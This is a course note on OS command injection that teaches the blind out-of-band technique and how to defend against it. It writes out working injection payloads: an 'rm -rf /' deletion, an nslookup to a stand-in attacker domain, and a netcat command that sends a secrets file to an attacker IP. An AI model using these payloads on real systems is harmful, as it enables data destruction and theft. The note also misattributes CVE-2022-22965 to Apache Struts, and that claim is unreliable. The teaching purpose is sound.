---
course: Web Security
topic: OS Command Injection
tags: [web-security]
---

## OS Command Injection: An In-Depth Analysis

### Introduction to OS Command Injection

OS Command Injection is a type of security vulnerability that occurs when an attacker can inject arbitrary operating system commands into an application. This typically happens through user input fields that are not properly sanitized or validated. The injected commands are executed by the underlying operating system, potentially leading to unauthorized access, data theft, or even complete system compromise.

#### Why Does OS Command Injection Matter?

Command injection vulnerabilities are critical because they allow attackers to bypass application logic and execute arbitrary commands on the server. This can lead to severe consequences such as:

- **Data Exfiltration**: Stealing sensitive information stored on the server.
- **System Compromise**: Gaining control over the server and executing malicious actions.
- **Denial of Service (DoS)**: Disrupting the normal operation of the server.

### Understanding the Vulnerability

To understand OS Command Injection, let's break down the components involved:

1. **User Input**: Typically comes from form fields, URL parameters, or API endpoints.
2. **Application Logic**: Processes the user input and constructs a command string.
3. **Operating System**: Executes the constructed command string.

#### Example Scenario

Consider a web application that allows users to submit feedback via a form. The form includes fields like `name`, `email`, and `message`. The application might construct a command to send an email using the `mail` utility:

```python
import subprocess

def send_feedback(name, email, message):
    command = f"/usr/bin/mail -s 'Feedback from {name}' {email} <<< '{message}'"
    subprocess.run(command, shell=True)
```

If the `email` field is not properly sanitized, an attacker could inject a command like `'; rm -rf /; echo '`. This would result in the following command being executed:

```bash
/usr/bin/mail -s 'Feedback from Alice' '; rm -rf /; echo ' <<< 'This is a test'
```

The `rm -rf /` command would delete all files on the server, causing significant damage.

### Blind OS Command Injection

Blind OS Command Injection occurs when the attacker cannot directly observe the output of the injected command. Instead, they rely on indirect methods to confirm whether the command was executed successfully.

#### Example Scenario

In the given transcript, the application responds with "Thank you for submitting feedback" regardless of the input. This makes it difficult to determine if the command injection was successful based solely on the response.

### Confirming Vulnerability

To confirm that the `email` field is vulnerable to command injection, we can use a technique called **Out-of-Band Data Exfiltration**. This involves sending data to a remote server controlled by the attacker.

#### Step-by-Step Process

1. **Identify the Vulnerable Field**: In this case, the `email` field is suspected to be vulnerable.
2. **Inject a Command**: Inject a command that performs an action observable from outside the application.
3. **Monitor the Action**: Check if the action was performed to confirm the vulnerability.

#### Example Command Injection

Let's inject a command that performs an NS lookup on a collaborator domain:

```python
import subprocess

def send_feedback(name, email, message):
    command = f"/usr/bin/mail -s 'Feedback from {name}' {email} <<< '{message}'"
    subprocess.run(command, shell=True)
```

Inject the following payload into the `email` field:

```plaintext
'; nslookup <collaborator_domain>; echo '
```

Replace `<collaborator_domain>` with a domain controlled by the attacker. For example, if the collaborator domain is `attacker.com`, the payload becomes:

```plaintext
'; nslookup attacker.com; echo '
```

This will result in the following command being executed:

```bash
/usr/bin/mail -s 'Feedback from Alice' '; nslookup attacker.com; echo ' <<< 'This is a test'
```

The `nslookup` command will attempt to resolve the domain `attacker.com`, and the attacker can monitor DNS queries to confirm if the command was executed.

### Exploiting the Vulnerability

Once the vulnerability is confirmed, the next step is to exploit it to exfiltrate data.

#### Example Exploit

Assume the application stores sensitive data in a file `/etc/secrets.txt`. We can inject a command to read this file and send the contents to the attacker's server.

```plaintext
'; cat /etc/secrets.txt | nc <attacker_ip> <attacker_port>; echo '
```

Replace `<attacker_ip>` and `<attacker_port>` with the IP address and port number of the attacker's server. For example:

```plaintext
'; cat /etc/secrets.txt | nc 192.168.1.100 4444; echo '
```

This will result in the following command being executed:

```bash
/usr/bin/mail -s 'Feedback from Alice' '; cat /etc/secrets.txt | nc 192.168.1.100 4444; echo ' <<< 'This is a test'
```

The `cat` command reads the contents of `/etc/secrets.txt`, and the `nc` command sends the data to the attacker's server.

### Real-World Examples

#### Recent CVEs and Breaches

- **CVE-2021-44228 (Log4Shell)**: Although primarily a Remote Code Execution (RCE) vulnerability, Log4Shell can be exploited to achieve OS Command Injection. Attackers can inject malicious payloads into log messages, leading to arbitrary command execution.
- **CVE-2022-22965 (Apache Struts RCE)**: Similar to Log4Shell, this vulnerability can be exploited to execute arbitrary commands on the server.

### How to Prevent / Defend Against OS Command Injection

#### Detection

- **Static Code Analysis**: Use tools like SonarQube, Fortify, or Veracode to scan for potential command injection vulnerabilities.
- **Dynamic Analysis**: Use fuzzing tools like AFL or Boofuzz to test the application for unexpected behavior.
- **Logging and Monitoring**: Implement logging and monitoring to detect unusual activity, such as unexpected DNS queries or network traffic.

#### Prevention

- **Input Validation**: Validate and sanitize all user inputs to ensure they do not contain malicious characters.
- **Use Safe APIs**: Avoid using shell commands and instead use safe APIs provided by the programming language.
- **Least Privilege Principle**: Run the application with the least privileges necessary to minimize the impact of a successful attack.

#### Secure Coding Fixes

##### Vulnerable Code

```python
import subprocess

def send_feedback(name, email, message):
    command = f"/usr/bin/mail -s 'Feedback from {name}' {email} <<< '{message}'"
    subprocess.run(command, shell=True)
```

##### Secure Code

```python
import smtplib
from email.mime.text import MIMEText

def send_feedback(name, email, message):
    msg = MIMEText(message)
    msg['Subject'] = f'Feedback from {name}'
    msg['From'] = 'no-reply@example.com'
    msg['To'] = email
    
    try:
        server = smtplib.SMTP('localhost')
        server.sendmail(msg['From'], [msg['To']], msg.as_string())
        server.quit()
    except Exception as e:
        print(f"Failed to send email: {e}")
```

### Network Topology and Request/Response Flow

#### Mermaid Diagram

```mermaid
sequenceDiagram
    participant User
    participant Application
    participant Server
    participant AttackerServer

    User->>Application: POST /submit-feedback
    Application->>Server: /usr/bin/mail -s 'Feedback from Alice' '; nslookup attacker.com; echo ' <<< 'This is a test'
    Server-->>AttackerServer: DNS Query for attacker.com
    AttackerServer-->>Server: DNS Response
    Server-->>Application: Thank you for submitting feedback
    Application-->>User: Thank you for submitting feedback
```

### Complete Example

#### HTTP Request

```http
POST /submit-feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

name=Alice&email=%27%3B+nslookup+attacker.com%3B+echo+%27&message=This+is+a+test
```

#### HTTP Response

```http
HTTP/1.1 200 OK
Date: Mon, 23 Jan 2023 12:00:00 GMT
Content-Type: text/html; charset=UTF-8
Content-Length: 35

Thank you for submitting feedback
```

### Common Mistakes and Pitfalls

- **Overlooking Input Validation**: Failing to validate and sanitize user inputs can lead to command injection vulnerabilities.
- **Using Shell Commands**: Using shell commands instead of safe APIs increases the risk of command injection.
- **Running with Elevated Privileges**: Running the application with elevated privileges can amplify the impact of a successful attack.

### Hands-On Labs

For hands-on practice with OS Command Injection, consider the following labs:

- **PortSwigger Web Security Academy**: Offers interactive labs on various web security topics, including command injection.
- **OWASP Juice Shop**: A deliberately insecure web application for practicing web security skills.
- **DVWA (Damn Vulnerable Web Application)**: A PHP/MySQL web application that contains numerous security vulnerabilities.

### Conclusion

OS Command Injection is a serious security vulnerability that can have severe consequences. By understanding the mechanics of command injection, confirming the vulnerability, and exploiting it, you can better protect your applications against such attacks. Always follow secure coding practices and implement robust detection and prevention mechanisms to mitigate the risk of command injection vulnerabilities.

---
<!-- nav -->
[[Web Security (PortSwigger)/10-OS Command Injection/06-Lab 5 Blind OS command injection with out of band data exfiltration/04-How to Prevent  Defend Against OS Command Injection|How to Prevent  Defend Against OS Command Injection]] | [[Web Security (PortSwigger)/10-OS Command Injection/06-Lab 5 Blind OS command injection with out of band data exfiltration/00-Overview|Overview]] | [[06-Pitfalls and Common Mistakes|Pitfalls and Common Mistakes]]
